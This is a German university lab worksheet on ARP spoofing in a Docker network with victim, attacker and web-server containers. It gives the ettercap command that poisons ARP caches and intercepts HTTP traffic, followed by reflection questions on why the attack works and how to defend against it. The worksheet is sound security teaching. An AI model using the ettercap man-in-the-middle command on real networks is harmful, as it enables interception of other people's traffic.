# lab02 – ARP Spoofing: Wer sitzt in deinem Netz?

| | |
|---|---|
| **Modul** | Sichere Netzwerke |
| **Hochschule** | FOM Hochschule für Oekonomie & Management |
| **Semester** | Sommersemester 2026 |
| **Dauer** | ca. 90 Minuten |
| **Voraussetzungen** | Docker Desktop installiert, Linux-Grundkenntnisse, lab01 abgeschlossen |

---

## Lernziele

Nach diesem Lab kannst du...

1. erklären, warum ARP als Protokoll keine Möglichkeit hat, Absender zu authentifizieren
2. beschreiben, wie ein Angreifer im gleichen Netz den ARP-Cache eines anderen Hosts manipuliert
3. einen ARP-Spoofing-Angriff mit ettercap durchführen und den Datenverkehr mitschneiden
4. begründen, warum das Opfer einen solchen Angriff nicht unmittelbar bemerkt
5. geeignete Gegenmaßnahmen auf Netzwerkebene benennen und einordnen

---

## Das Szenario

Du arbeitest mit drei Containern. Ein **Opfer** kommuniziert regelmäßig mit einem **Webserver** im gleichen Netz. Ein **Angreifer** befindet sich ebenfalls in diesem Netz – und hat die Möglichkeit, sich zwischen beide zu drängen, ohne dass dafür ein Kabel umgesteckt werden muss.

> **Leitfrage:** Wenn zwei Geräte im gleichen Netz kommunizieren – wie stellt man sicher, dass ein Paket wirklich beim richtigen Empfänger ankommt?

---

## Topologie

```
  ┌─────────────────┐       ┌──────────────────┐       ┌─────────────────┐
  │   lab02-alice   │       │  lab02-mallory   │       │  lab02-gateway  │
  │    (Opfer)      │       │   (Angreifer)    │       │  (Webserver)    │
  └─────────────────┘       └──────────────────┘       └─────────────────┘

         Alle drei Container im selben Netz: lab02-net (/24)
         IPs werden beim Start vergeben – siehe setup.sh-Ausgabe
         oder jederzeit: cat /etc/lab-info  (in jedem Container)
```

| Container | Image | Rolle |
|---|---|---|
| `lab02-alice` | `ubuntu:22.04` | Opfer – sendet HTTP-Anfragen an gateway |
| `lab02-mallory` | `kalilinux/kali-rolling` | Angreifer im gleichen Segment |
| `lab02-gateway` | `alpine:latest` | HTTP-Webserver (Port 80) |

> **Hinweis:** Die IP-Adressen werden beim Start dynamisch vergeben.
> `./setup.sh` zeigt sie am Ende an. In jedem Container steht außerdem:
> ```bash
> cat /etc/lab-info
> ```

---

## Aufgaben

### Schritt 1 – Lab starten

```bash
chmod +x setup.sh teardown.sh
./setup.sh
```

Warte bis `Lab ist bereit!` erscheint. Notiere die angezeigten IP-Adressen:

```
IP alice   (Opfer):      _______________________
IP gateway (Webserver):  _______________________
IP mallory (Angreifer):  _______________________
```

---

### Schritt 2 – Drei Terminals öffnen

```bash
# Terminal A – alice (Opfer)
docker exec -it lab02-alice bash

# Terminal B – mallory (Angreifer)
docker exec -it lab02-mallory bash

# Terminal C – Host (für Beobachtung)
# bleibt im normalen Terminal
```

---

### Schritt 3 – Netzwerk erkunden

Auf **alice** (Terminal A):

```bash
# ARP-Cache anzeigen
arp -n

# Webserver erreichbar?
curl -s http://<IP von gateway>/
```

Notiere die MAC-Adresse für gateway:

```
MAC-Adresse von gateway (vor Angriff): _______________________________
```

> **Frage:** Zu welchem Container gehört diese MAC?
> ```bash
> docker exec lab02-gateway ip link show eth0
> docker exec lab02-mallory ip link show eth0
> ```

---

### Schritt 4 – Angriff starten: ettercap

Wechsle zu **Terminal B (lab02-mallory)**:

```bash
ettercap -T -i eth0 -M arp:remote /<IP von alice>// /<IP von gateway>//
```

**Was bedeuten die Parameter?**

| Parameter | Bedeutung |
|---|---|
| `-T` | Text-Modus (kein GUI) |
| `-i eth0` | Netzwerk-Interface |
| `-M arp:remote` | MitM via ARP, remote = auch Pakete weiterleiten |
| `/<IP>//` | Ziel-Host (leere zweite IP = alle Ports) |

Warte bis du siehst:
```
ARP poisoning victims:
  GROUP 1 : <IP alice>
  GROUP 2 : <IP gateway>
Starting Unified sniffing...
```

---

### Schritt 5 – ARP-Cache auf alice beobachten

Öffne **Terminal C** und beobachte den ARP-Cache von alice alle 2 Sekunden:

```bash
watch -n 2 "docker exec lab02-alice arp -n"
```

> **Beobachte:** Ändert sich die MAC-Adresse für gateway?
> Vergleiche mit deiner Notiz aus Schritt 3.

Notiere die MAC nach dem Angriff:

```
MAC-Adresse von gateway (nach Angriff): _______________________________
```

---

### Schritt 6 – Traffic auf mallory beobachten

Schau auf die ettercap-Ausgabe in Terminal B. Warte ca. 30 Sekunden.

> **Beobachte:**
> - Was siehst du im Mitschnitt?
> - Welche Informationen aus der HTTP-Kommunikation sind lesbar?

**Notiere deine Beobachtungen:**

```
_______________________________________________
_______________________________________________
_______________________________________________
```

Beobachte parallel die ARP-Pakete auf alice:

```bash
# Neues Terminal:
docker exec lab02-alice tcpdump -i eth0 -n arp
```

> **Frage:** Wer sendet ARP-Pakete? Was behaupten diese Pakete?

---

### Schritt 7 – Merkt alice etwas?

Prüfe in Terminal A, ob die Verbindung noch funktioniert:

```bash
curl -s http://<IP von gateway>/
```

**Was fällt auf?**

```
_______________________________________________
```

---

### Schritt 8 – Angriff stoppen

In Terminal B: `Ctrl+Q`

> **Was passiert beim Beenden?**
> ettercap sendet nach dem Beenden automatisch korrekte ARP-Replies,
> um die vergifteten Caches zu bereinigen. Beobachte den ARP-Cache in Terminal C.

---

### Schritt 9 – Cleanup

```bash
./teardown.sh
docker ps   # keine Container mehr aktiv
```

---

## Reflexionsfragen

**F1 – Was hast du beobachtet?**
Beschreibe in eigenen Worten, was mallory während des Angriffs sehen konnte.

**F2 – Warum funktioniert das?**
Erkläre, warum alice seinen Traffic an mallory schickt – obwohl alice eigentlich gateway erreichen möchte.

**F3 – Welche Rolle spielt `ip_forward`?**
Was würde passieren, wenn diese Einstellung auf mallory nicht aktiv wäre?

**F4 – Hat alice etwas bemerkt?**
Was sagt dir das über reale Angreiferszenarien in Büro- oder Campusnetzen?

**F5 – Wie nennt sich dieser Angriff?**
Recherchiere den Fachbegriff für diese Art der Manipulation.
Welcher übergeordnete Angriffstyp (aus lab01 bekannt) wird damit realisiert?

**F6 – Schutzmaßnahmen**
Nenne mindestens drei technische Maßnahmen, die diesen Angriff verhindern.
Auf welcher OSI-Schicht wirkt jeweils welche Maßnahme?

---

## Quick Reference

| Befehl | Beschreibung | Container |
|---|---|---|
| `cat /etc/lab-info` | IP-Übersicht anzeigen | alle |
| `arp -n` | ARP-Cache anzeigen | lab02-alice |
| `ip link show eth0` | MAC-Adresse anzeigen | alle |
| `curl -s http://<ip>/` | HTTP-Anfrage senden | lab02-alice |
| `tcpdump -i eth0 -n arp` | ARP-Pakete mitschneiden | lab02-alice |
| `ettercap -T -i eth0 -M arp:remote /IP1// /IP2//` | ARP Spoofing + Mitschnitt | lab02-mallory |
| `watch -n 2 "docker exec lab02-alice arp -n"` | ARP-Cache beobachten | Host |
| `./setup.sh` | Lab starten | Host |
| `./teardown.sh` | Lab beenden | Host |